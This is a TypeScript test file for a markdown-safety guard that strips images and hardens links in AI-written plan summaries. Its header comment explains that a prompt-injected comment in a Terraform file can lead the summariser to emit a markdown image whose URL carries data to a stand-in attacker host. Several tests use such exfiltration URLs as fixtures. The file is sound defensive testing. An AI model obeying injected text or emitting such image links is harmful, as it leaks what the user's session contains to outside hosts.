/**
 * What model-authored markdown is allowed to render.
 *
 * `![](https://attacker.example/pixel.png?d=<what the model read>)` is ordinary
 * markdown — no raw HTML needed, so react-markdown's HTML refusal does not help
 * — and it fires a request the moment the panel renders, carrying the viewer's
 * IP and a referer naming the Terrapod host. The model's input includes the
 * plan, so nobody has to be malicious: a prompt-injected comment in a `.tf` file
 * reaches the summariser as ordinary context.
 *
 * These assert on the react elements the map produces, so they hold whatever
 * react-markdown does with them. React elements from createElement are plain
 * objects, so no renderer is needed.
 */
import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { createElement, type ComponentPropsWithoutRef, type ReactElement } from 'react'

import {
  MARKDOWN_SAFETY,
  SAFE_LINK_REL,
  dropImage,
  safeLink,
  withMarkdownSafety,
} from '../src/lib/markdown-safety.ts'
import type { Components } from 'react-markdown'

/** Invoke a components-map entry as react-markdown would. */
function render(entry: unknown, props: Record<string, unknown>): unknown {
  return (entry as (p: Record<string, unknown>) => unknown)(props)
}

describe('remote images never render', () => {
  it('drops an image outright', () => {
    assert.equal(dropImage(), null)
  })

  it('drops a remote image through the default map', () => {
    assert.equal(
      render(MARKDOWN_SAFETY.img, { src: 'https://attacker.example/pixel.png?d=leak', alt: '' }),
      null,
    )
  })

  it('drops a local image too — a plan summary has no legitimate image', () => {
    assert.equal(render(MARKDOWN_SAFETY.img, { src: '/logo.svg', alt: 'x' }), null)
  })

  it('drops a protocol-relative image, which a src allow-list would miss', () => {
    assert.equal(render(MARKDOWN_SAFETY.img, { src: '//attacker.example/p.png' }), null)
  })
})

describe('model-authored links carry the rel', () => {
  it('sets rel on an unstyled link', () => {
    const el = safeLink({ href: 'https://example.test/', children: 'docs' }) as ReactElement<{
      rel?: string
      href?: string
    }>
    assert.equal(el.type, 'a')
    assert.equal(el.props.rel, SAFE_LINK_REL)
    assert.equal(el.props.href, 'https://example.test/')
  })

  it('sets rel through the default map', () => {
    const el = render(MARKDOWN_SAFETY.a, { href: 'https://example.test/' }) as ReactElement<{
      rel?: string
    }>
    assert.equal(el.props.rel, SAFE_LINK_REL)
  })

  it('names both tokens — noopener is the one that matters here', () => {
    // Referrer-Policy already withholds the path cross-origin; noopener is what
    // stops the opened page reaching back through window.opener.
    assert.ok(SAFE_LINK_REL.split(/\s+/).includes('noopener'))
    assert.ok(SAFE_LINK_REL.split(/\s+/).includes('noreferrer'))
  })
})

describe('the hast node react-markdown passes to custom components', () => {
  // react-markdown sets passNode: true, so a CUSTOM component receives the hast
  // node — which its own built-in renderer never did. Spreading it onto the
  // element renders `node="[object Object]"`, so taking over `a` is what
  // introduces that, on three surfaces that previously used the default.
  it('does not reach the anchor element', () => {
    const el = safeLink({
      href: 'https://example.test/',
      node: { type: 'element', tagName: 'a' },
    }) as ReactElement<Record<string, unknown>>
    assert.ok(!('node' in el.props), `node survived: ${JSON.stringify(Object.keys(el.props))}`)
    assert.equal(el.props.href, 'https://example.test/')
    assert.equal(el.props.rel, SAFE_LINK_REL)
  })

  it('does not reach a styled anchor either', () => {
    const Styled = (props: ComponentPropsWithoutRef<'a'>) => createElement('a', props)
    const map = withMarkdownSafety({ a: Styled })
    const el = render(map.a, {
      href: 'https://example.test/',
      node: { type: 'element', tagName: 'a' },
    }) as ReactElement<Record<string, unknown>>
    assert.ok(!('node' in el.props), `node survived: ${JSON.stringify(Object.keys(el.props))}`)
    assert.equal(el.props.rel, SAFE_LINK_REL)
  })
})

describe('layering safety over a surface that has its own styling map', () => {
  // Three of the six surfaces style their markdown, and two of those style `a`.
  // A plain { ...SAFETY, ...overrides } spread would let those two silently drop
  // the rel, which is the whole reason this is a function.
  // Typed as the real components are, so these stand in for the shipped maps
  // rather than for a looser shape tsc would never accept in src/.
  const StyledAnchor = (props: ComponentPropsWithoutRef<'a'>) =>
    createElement('a', { ...props, className: 'text-brand-400 underline' })
  const StyledCode = (props: ComponentPropsWithoutRef<'code'>) => createElement('code', props)

  it('keeps the surface own entries', () => {
    const map = withMarkdownSafety({ code: StyledCode })
    assert.equal(map.code, StyledCode)
  })

  it('wraps a styled anchor rather than displacing it', () => {
    const map = withMarkdownSafety({ a: StyledAnchor })
    const outer = render(map.a, { href: 'https://example.test/' }) as ReactElement<{
      rel?: string
      href?: string
    }>
    // The styled component is still the thing being rendered …
    assert.equal(outer.type, StyledAnchor)
    // … and it is handed the rel, which its own `{...props}` spread passes on.
    assert.equal(outer.props.rel, SAFE_LINK_REL)
    assert.equal(outer.props.href, 'https://example.test/')

    const inner = StyledAnchor(outer.props as ComponentPropsWithoutRef<'a'>) as ReactElement<{
      rel?: string
      className?: string
    }>
    assert.equal(inner.props.rel, SAFE_LINK_REL)
    assert.equal(inner.props.className, 'text-brand-400 underline')
  })

  it('refuses an img the surface map tried to supply', () => {
    // Safety wins over the map, not the other way round.
    // Deliberately the wrong element type: the point is that safety wins over
    // whatever the styling map supplied for `img`, not that the map was sane.
    const map = withMarkdownSafety({ img: StyledCode as unknown as Components['img'] })
    assert.notEqual(map.img, StyledCode)
    assert.equal(render(map.img, { src: 'https://attacker.example/p.png' }), null)
  })

  it('guards a map with no a and no img', () => {
    const map = withMarkdownSafety({ code: StyledCode })
    assert.equal(render(map.img, { src: 'https://attacker.example/p.png' }), null)
    const el = render(map.a, { href: 'https://example.test/' }) as ReactElement<{ rel?: string }>
    assert.equal(el.props.rel, SAFE_LINK_REL)
  })
})

describe('rendered through the real react-markdown', () => {
  // The map's shape is one thing; what reaches the browser is another. This
  // drives the actual library, so it holds whatever react-markdown does with a
  // components map. It is also what revealed that React emits a
  // `<link rel="preload" as="image">` for the URL as well as the <img> — the
  // fetch happens from the document head, earlier than the element.
  const MARKDOWN =
    '![pixel](https://attacker.example/p.png?d=leak) and [a link](https://example.test/)'

  it('renders neither the image nor its preload', async () => {
    const { renderToStaticMarkup } = await import('react-dom/server')
    const ReactMarkdown = (await import('react-markdown')).default

    const guarded = renderToStaticMarkup(
      createElement(ReactMarkdown, { components: MARKDOWN_SAFETY }, MARKDOWN),
    )

    assert.ok(
      !guarded.includes('attacker.example'),
      `the attacker URL reached the output: ${guarded}`,
    )
    assert.ok(!guarded.includes('<img'), `an img element survived: ${guarded}`)
    assert.ok(!guarded.includes('preload'), `a preload hint survived: ${guarded}`)
    // The prose around it still renders, and the link still works.
    assert.match(guarded, /<a href="https:\/\/example\.test\/"[^>]*>a link<\/a>/)
    assert.match(guarded, /rel="noopener noreferrer"/)
    // The bogus DOM attribute from the hast node is not in the output.
    assert.ok(!guarded.includes('node='), `the hast node reached the DOM: ${guarded}`)
  })

  it('is the guard doing it — unguarded, the same markdown fetches the URL', async () => {
    // Pins the vulnerability itself, so the test above cannot pass by accident
    // if react-markdown ever stops rendering images at all.
    const { renderToStaticMarkup } = await import('react-dom/server')
    const ReactMarkdown = (await import('react-markdown')).default

    const unguarded = renderToStaticMarkup(createElement(ReactMarkdown, null, MARKDOWN))

    assert.ok(unguarded.includes('attacker.example'), 'expected the unguarded render to leak')
    assert.ok(unguarded.includes('<img'), 'expected an img element when unguarded')
  })
})
